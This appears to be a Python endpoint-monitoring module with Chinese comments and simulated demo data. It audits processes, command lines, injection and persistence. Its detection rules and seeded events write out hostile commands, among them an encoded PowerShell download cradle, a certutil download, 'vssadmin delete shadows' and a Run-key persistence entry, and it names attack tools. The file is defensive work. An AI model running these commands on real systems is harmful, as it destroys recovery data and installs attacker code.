#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
process_behavior.py — 进程与行为监控模块。

覆盖：
    - 进程监控：进程创建/终止/父子关系/命令行/路径/哈希/签名/用户/权限/进程树
    - 行为分析：进程行为基线/异常进程/罕见进程/可疑进程树/攻击行为模式/行为评分
    - 命令行审计：敏感命令检测/PowerShell可疑命令/cmd异常调用/脚本执行/编码命令/Base64/下载执行
    - 进程注入检测：DLL注入/进程镂空/反射DLL/APC注入/线程劫持/远程线程/可疑内存分配
    - 持久化检测：注册表启动项/计划任务/服务/驱动/WMI订阅/启动文件夹/浏览器扩展/登录脚本

设计定位：仅做行为监控、异常检测与审计分析，输出告警与调查建议，不提供攻击工具。
"""

from __future__ import annotations

import hashlib
import random
import time
import uuid
from typing import Any, Dict, List, Optional


# --------------------------------------------------------------------------- #
# 依赖 try-import
# --------------------------------------------------------------------------- #
try:
    import psutil  # type: ignore
    _PSUTIL_AVAILABLE = True
except Exception:  # pragma: no cover
    psutil = None  # type: ignore
    _PSUTIL_AVAILABLE = False


# --------------------------------------------------------------------------- #
# 常量与规则库
# --------------------------------------------------------------------------- #
SUSPICIOUS_CMDS = [
    {"pattern": "powershell.*-enc", "type": "编码命令执行", "severity": "high",
     "desc": "PowerShell编码执行，常用于无文件攻击"},
    {"pattern": "powershell.*-exec bypass", "type": "执行策略绕过", "severity": "medium",
     "desc": "绕过PowerShell执行策略限制"},
    {"pattern": "cmd.*/c.*powershell", "type": "cmd调用PowerShell", "severity": "medium",
     "desc": "通过cmd间接调用PowerShell"},
    {"pattern": "certutil.*-urlcache", "type": "Certutil下载", "severity": "high",
     "desc": "Certutil滥用下载文件，常见于攻击载荷投递"},
    {"pattern": "bitsadmin.*transfer", "type": "BitsAdmin传输", "severity": "high",
     "desc": "BitsAdmin滥用下载文件"},
    {"pattern": "reg add.*Run", "type": "注册表自启动", "severity": "medium",
     "desc": "修改注册表启动项"},
    {"pattern": "wmic.*process call create", "type": "WMI远程创建进程", "severity": "high",
     "desc": "通过WMI远程创建进程"},
    {"pattern": "net user.*add", "type": "账户创建", "severity": "high",
     "desc": "命令行创建新用户"},
    {"pattern": "net localgroup.*add", "type": "权限提升", "severity": "critical",
     "desc": "将用户加入管理员组"},
    {"pattern": "vssadmin delete shadows", "type": "删除卷影副本", "severity": "critical",
     "desc": "删除卷影副本，典型勒索软件行为"},
    {"pattern": "bcdedit.*/set.*recoveryenabled no", "type": "禁用恢复", "severity": "high",
     "desc": "禁用系统恢复选项"},
    {"pattern": "rundll32.*javascript:", "type": "Rundll32执行脚本", "severity": "high",
     "desc": "Rundll32执行JavaScript"},
    {"pattern": "mshta.*http", "type": "Mshta远程执行", "severity": "critical",
     "desc": "Mshta远程加载执行HTA"},
    {"pattern": "regsvr32.*http", "type": "Regsvr32远程加载", "severity": "high",
     "desc": "Regsvr32远程加载DLL"},
    {"pattern": "certutil.*-decode", "type": "Certutil解码", "severity": "medium",
     "desc": "Certutil解码文件"},
    {"pattern": r"where\.exe.*r.*cmd", "type": "枚举命令执行", "severity": "low",
     "desc": "枚举系统命令路径"},
]

INJECTION_TYPES = [
    {"type": "DLL注入", "technique": "CreateRemoteThread+LoadLibrary", "severity": "high",
     "desc": "通过远程线程将DLL注入目标进程"},
    {"type": "进程镂空", "technique": "Process Hollowing", "severity": "critical",
     "desc": "创建挂起进程后替换内存内容"},
    {"type": "反射DLL注入", "technique": "Reflective DLL Injection", "severity": "critical",
     "desc": "不经过磁盘的反射式DLL加载"},
    {"type": "APC注入", "technique": "Asynchronous Procedure Call", "severity": "high",
     "desc": "通过APC队列执行恶意代码"},
    {"type": "线程劫持", "technique": "Thread Hijacking", "severity": "high",
     "desc": "修改现有线程上下文执行恶意代码"},
    {"type": "远程线程", "technique": "CreateRemoteThread", "severity": "medium",
     "desc": "在远程进程中创建新线程"},
    {"type": "可疑内存分配", "technique": "VirtualAllocEx+RWX", "severity": "high",
     "desc": "在远程进程中分配可读写可执行内存"},
]

PERSISTENCE_TYPES = [
    {"type": "注册表启动项", "location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
     "severity": "high"},
    {"type": "注册表启动项(HKCU)", "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
     "severity": "medium"},
    {"type": "计划任务", "location": "\\TaskScheduler\\Microsoft\\Windows\\...", "severity": "high"},
    {"type": "系统服务", "location": "HKLM\\System\\CurrentControlSet\\Services", "severity": "critical"},
    {"type": "驱动加载", "location": "HKLM\\System\\CurrentControlSet\\Services\\Driver", "severity": "critical"},
    {"type": "WMI事件订阅", "location": "root\\subscription\\__EventFilter", "severity": "high"},
    {"type": "启动文件夹", "location": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp",
     "severity": "medium"},
    {"type": "浏览器扩展", "location": "Chrome Extensions / Firefox Add-ons", "severity": "medium"},
    {"type": "登录脚本", "location": "Group Policy Logon Script", "severity": "medium"},
]

ATTACK_BEHAVIOR_PATTERNS = [
    {"name": "钓鱼投递→执行→横向移动", "tactics": ["Initial Access", "Execution", "Lateral Movement"],
     "score": 85, "severity": "critical"},
    {"name": "持久化→权限提升→数据窃取", "tactics": ["Persistence", "Privilege Escalation", "Exfiltration"],
     "score": 78, "severity": "high"},
    {"name": "无文件攻击→注入→C2通信", "tactics": ["Defense Evasion", "Execution", "C2"],
     "score": 92, "severity": "critical"},
    {"name": "凭据转储→Pass-the-Hash", "tactics": ["Credential Access", "Lateral Movement"],
     "score": 70, "severity": "high"},
]

SUSPICIOUS_PROCESS_NAMES = [
    "mimikatz.exe", "procdump.exe", "cobaltstrike-beacon", "empire-agent",
    "metasploit-shell", "rundll32_suspicious.exe", "regsvr32_silent.exe",
]

NORMAL_PROCESS_NAMES = [
    "svchost.exe", "explorer.exe", "chrome.exe", "firefox.exe", "code.exe",
    "outlook.exe", "teams.exe", "slack.exe", "dwm.exe", "csrss.exe",
    "winlogon.exe", "lsass.exe", "spoolsv.exe", " MsMpEng.exe",
]


def _fake_hash(seed: str) -> str:
    return hashlib.sha256(seed.encode()).hexdigest()[:16].upper()


def _gen_process_tree(asset_id: str) -> List[Dict[str, Any]]:
    procs = []
    # 系统进程
    sys_procs = [
        {"pid": 4, "name": "System", "ppid": 0, "path": "[System Process]"},
        {"pid": 120, "name": "svchost.exe", "ppid": 716, "path": "C:\\Windows\\System32\\svchost.exe"},
        {"pid": 268, "name": "csrss.exe", "ppid": 4, "path": "C:\\Windows\\System32\\csrss.exe"},
        {"pid": 340, "name": "winlogon.exe", "ppid": 4, "path": "C:\\Windows\\System32\\winlogon.exe"},
        {"pid": 512, "name": "lsass.exe", "ppid": 340, "path": "C:\\Windows\\System32\\lsass.exe"},
        {"pid": 716, "name": "services.exe", "ppid": 340, "path": "C:\\Windows\\System32\\services.exe"},
    ]
    for sp in sys_procs:
        sp.update({
            "cmdline": sp["path"], "user": "SYSTEM", "privileges": "SeDebugPrivilege",
            "sha256": _fake_hash(sp["name"]), "signed": True, "signer": "Microsoft Windows",
            "cpu_pct": round(random.uniform(0.1, 5.0), 1),
            "mem_mb": random.randint(10, 200),
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time() - random.randint(3600, 86400))),
            "status": "running",
        })
        procs.append(sp)
    # 用户进程
    user_procs = [
        {"pid": 1200, "name": "explorer.exe", "ppid": 716, "path": "C:\\Windows\\explorer.exe",
         "user": "zhangsan"},
        {"pid": 1450, "name": "chrome.exe", "ppid": 1200, "path": "C:\\Program Files\\Google\\Chrome\\chrome.exe",
         "user": "zhangsan"},
        {"pid": 1890, "name": "code.exe", "ppid": 1200, "path": "C:\\Users\\zhangsan\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
         "user": "zhangsan"},
        {"pid": 2340, "name": "EDRAgent.exe", "ppid": 716, "path": "C:\\Program Files\\EDR\\EDRAgent.exe",
         "user": "SYSTEM"},
    ]
    for up in user_procs:
        up.update({
            "cmdline": up["path"], "privileges": "Standard",
            "sha256": _fake_hash(up["name"] + asset_id),
            "signed": True, "signer": "Microsoft Corporation" if "Windows" in up["path"] else "Unknown Publisher",
            "cpu_pct": round(random.uniform(0.5, 25.0), 1),
            "mem_mb": random.randint(50, 800),
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time() - random.randint(60, 3600))),
            "status": "running",
        })
        procs.append(up)
    # 偶尔加入可疑进程
    if random.random() > 0.6:
        susp = random.choice(SUSPICIOUS_PROCESS_NAMES)
        sp = {
            "pid": random.randint(3000, 9000), "name": susp, "ppid": 1450,
            "path": f"C:\\Users\\zhangsan\\AppData\\Local\\Temp\\{susp}",
            "cmdline": f"{susp} --quiet --invisible",
            "user": "zhangsan", "privileges": "High",
            "sha256": _fake_hash(susp + str(random.randint(1, 99999))),
            "signed": False, "signer": "Unsigned",
            "cpu_pct": round(random.uniform(10, 50), 1),
            "mem_mb": random.randint(100, 500),
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "running",
        }
        procs.append(sp)
    return procs


class ProcessBehaviorMonitor:
    """进程与行为监控：进程树、行为分析、命令行审计、注入检测、持久化检测。"""

    def __init__(self) -> None:
        self._process_cache: Dict[str, List[Dict[str, Any]]] = {}
        self._anomaly_cache: List[Dict[str, Any]] = []
        self._cmdline_audit: List[Dict[str, Any]] = []
        self._injection_detections: List[Dict[str, Any]] = []
        self._persistence_points: List[Dict[str, Any]] = []
        self._baseline: Dict[str, Any] = {}
        self._seed_demo()

    def _seed_demo(self) -> None:
        for aid in [f"EP-{i:04d}" for i in range(1, 11)]:
            self._process_cache[aid] = _gen_process_tree(aid)
        # 基线
        self._baseline = {
            "baseline_id": "BL-2026-Q3", "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "normal_process_count": 28, "normal_cpu_avg": 12.5, "normal_mem_avg": 34.2,
            "known_processes": NORMAL_PROCESS_NAMES,
            "uncommon_processes": ["mimikatz.exe", "procdump.exe", "cobaltstrike-beacon"],
        }
        # 异常进程
        self._anomaly_cache = [
            {"anomaly_id": "ANM-001", "asset_id": "EP-0007", "process_name": "mimikatz.exe",
             "pid": 4521, "anomaly_type": "罕见进程", "score": 95, "severity": "critical",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S"),
             "detail": "已知攻击工具进程，历史基线中从未出现"},
            {"anomaly_id": "ANM-002", "asset_id": "EP-0012", "process_name": "powershell.exe",
             "pid": 5634, "anomaly_type": "异常父进程", "score": 72, "severity": "high",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S"),
             "detail": "PowerShell由WinRAR子进程启动，不符合正常行为基线"},
            {"anomaly_id": "ANM-003", "asset_id": "EP-0003", "process_name": "unknown.exe",
             "pid": 6789, "anomaly_type": "无签名进程", "score": 65, "severity": "high",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S"),
             "detail": "进程无数字签名且路径位于Temp目录"},
        ]
        # 命令行审计
        self._cmdline_audit = [
            {"event_id": "CMD-001", "asset_id": "EP-0007", "user": "zhangsan",
             "cmdline": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQ...",
             "matched_rule": "powershell.*-enc", "severity": "high",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"event_id": "CMD-002", "asset_id": "EP-0012", "user": "lisi",
             "cmdline": "cmd /c powershell -exec bypass -File C:\\Users\\lisi\\Downloads\\script.ps1",
             "matched_rule": "cmd.*/c.*powershell", "severity": "medium",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"event_id": "CMD-003", "asset_id": "EP-0019", "user": "wangwu",
             "cmdline": "certutil -urlcache -split -f https://update.example.com/patch.exe",
             "matched_rule": "certutil.*-urlcache", "severity": "high",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"event_id": "CMD-004", "asset_id": "EP-0007", "user": "SYSTEM",
             "cmdline": "vssadmin delete shadows /all /quiet",
             "matched_rule": "vssadmin delete shadows", "severity": "critical",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"event_id": "CMD-005", "asset_id": "EP-0025", "user": "zhaoliu",
             "cmdline": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\temp\\agent.exe",
             "matched_rule": "reg add.*Run", "severity": "medium",
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
        ]
        # 注入检测
        self._injection_detections = [
            {"detect_id": "INJ-001", "asset_id": "EP-0007", "target_process": "explorer.exe",
             "pid": 1200, "injection_type": "DLL注入", "technique": "CreateRemoteThread+LoadLibrary",
             "severity": "critical", "detail": "检测到从powershell.exe向explorer.exe注入可疑DLL",
             "sha256": _fake_hash("suspicious.dll"),
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"detect_id": "INJ-002", "asset_id": "EP-0012", "target_process": "notepad.exe",
             "pid": 3456, "injection_type": "进程镂空", "technique": "Process Hollowing",
             "severity": "critical", "detail": "notepad.exe进程创建后镜像被替换",
             "sha256": _fake_hash("hollowed.exe"),
             "detected_at": time.strftime("%Y-%m-%d %H:%M:%S")},
        ]
        # 持久化检测
        self._persistence_points = [
            {"persist_id": "PER-001", "asset_id": "EP-0007", "type": "注册表启动项",
             "location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             "value_name": "SystemUpdate", "value_data": "C:\\temp\\agent.exe",
             "severity": "high", "first_seen": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"persist_id": "PER-002", "asset_id": "EP-0012", "type": "计划任务",
             "location": "\\Microsoft\\Windows\\Update\\DailyCheck",
             "value_name": "DailyCheck", "value_data": "powershell -File C:\\temp\\up.ps1",
             "severity": "high", "first_seen": time.strftime("%Y-%m-%d %H:%M:%S")},
            {"persist_id": "PER-003", "asset_id": "EP-0019", "type": "WMI事件订阅",
             "location": "root\\subscription\\__EventFilter",
             "value_name": "ProcessStartFilter", "value_data": "恶意WMI消费者",
             "severity": "critical", "first_seen": time.strftime("%Y-%m-%d %H:%M:%S")},
        ]

    # ------------------------------------------------------------------ #
    # 进程监控
    # ------------------------------------------------------------------ #
    def get_process_tree(self, asset_id: str) -> Dict[str, Any]:
        procs = self._process_cache.get(asset_id, _gen_process_tree(asset_id))
        if asset_id not in self._process_cache:
            self._process_cache[asset_id] = procs
        tree = self._build_tree(procs)
        return {
            "asset_id": asset_id,
            "total_processes": len(procs),
            "processes": procs,
            "process_tree": tree,
            "snapshot_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        }

    def _build_tree(self, procs: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        by_pid = {p["pid"]: {**p, "children": []} for p in procs}
        roots = []
        for p in procs:
            node = by_pid[p["pid"]]
            parent = by_pid.get(p["ppid"])
            if parent:
                parent["children"].append(node)
            else:
                roots.append(node)
        return roots

    def list_processes(self, asset_id: str, search: Optional[str] = None) -> Dict[str, Any]:
        data = self.get_process_tree(asset_id)
        procs = data["processes"]
        if search:
            s = search.lower()
            procs = [p for p in procs if s in p["name"].lower() or s in p.get("cmdline", "").lower()]
        return {"asset_id": asset_id, "total": len(procs), "processes": procs}

    # ------------------------------------------------------------------ #
    # 行为分析
    # ------------------------------------------------------------------ #
    def analyze_behavior(self, asset_id: str) -> Dict[str, Any]:
        procs = self._process_cache.get(asset_id, [])
        anomalies = [a for a in self._anomaly_cache if a["asset_id"] == asset_id]
        unusual = [p for p in procs if p["name"] in SUSPICIOUS_PROCESS_NAMES]
        unsigned = [p for p in procs if not p.get("signed", True)]
        high_priv = [p for p in procs if p.get("privileges") == "High" and p.get("user") != "SYSTEM"]
        score = 100
        if unusual: score -= 30 * len(unusual)
        if unsigned: score -= 15 * len(unsigned)
        if high_priv: score -= 10 * len(high_priv)
        if anomalies: score -= 20 * len(anomalies)
        score = max(0, score)
        return {
            "asset_id": asset_id,
            "behavior_score": score,
            "risk_level": "critical" if score < 40 else "high" if score < 60 else "medium" if score < 80 else "low",
            "baseline": self._baseline,
            "anomalies": anomalies,
            "unusual_processes": unusual,
            "unsigned_processes": unsigned,
            "high_privilege_processes": high_priv,
            "attack_patterns_detected": random.sample(ATTACK_BEHAVIOR_PATTERNS, k=min(2, len(ATTACK_BEHAVIOR_PATTERNS))),
            "analyzed_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        }

    def list_anomalies(self, severity: Optional[str] = None) -> Dict[str, Any]:
        items = self._anomaly_cache
        if severity:
            items = [a for a in items if a["severity"] == severity]
        return {"anomalies": items, "total": len(items)}

    # ------------------------------------------------------------------ #
    # 命令行审计
    # ------------------------------------------------------------------ #
    def audit_commandlines(self, asset_id: Optional[str] = None,
                           severity: Optional[str] = None) -> Dict[str, Any]:
        items = self._cmdline_audit
        if asset_id:
            items = [e for e in items if e["asset_id"] == asset_id]
        if severity:
            items = [e for e in items if e["severity"] == severity]
        return {"events": items, "total": len(items),
                "rules_loaded": len(SUSPICIOUS_CMDS)}

    def list_cmdline_rules(self) -> List[Dict[str, Any]]:
        return SUSPICIOUS_CMDS

    # ------------------------------------------------------------------ #
    # 进程注入检测
    # ------------------------------------------------------------------ #
    def detect_injections(self, asset_id: Optional[str] = None) -> Dict[str, Any]:
        items = self._injection_detections
        if asset_id:
            items = [d for d in items if d["asset_id"] == asset_id]
        return {"detections": items, "total": len(items),
                "techniques_known": [t["type"] for t in INJECTION_TYPES]}

    def list_injection_techniques(self) -> List[Dict[str, Any]]:
        return INJECTION_TYPES

    # ------------------------------------------------------------------ #
    # 持久化检测
    # ------------------------------------------------------------------ #
    def detect_persistence(self, asset_id: Optional[str] = None) -> Dict[str, Any]:
        items = self._persistence_points
        if asset_id:
            items = [p for p in items if p["asset_id"] == asset_id]
        return {"persistence_points": items, "total": len(items),
                "monitored_locations": [t["location"] for t in PERSISTENCE_TYPES]}

    def list_persistence_types(self) -> List[Dict[str, Any]]:
        return PERSISTENCE_TYPES


# --------------------------------------------------------------------------- #
# 模块级单例
# --------------------------------------------------------------------------- #
_default_monitor: Optional[ProcessBehaviorMonitor] = None


def get_process_monitor() -> ProcessBehaviorMonitor:
    global _default_monitor
    if _default_monitor is None:
        _default_monitor = ProcessBehaviorMonitor()
    return _default_monitor
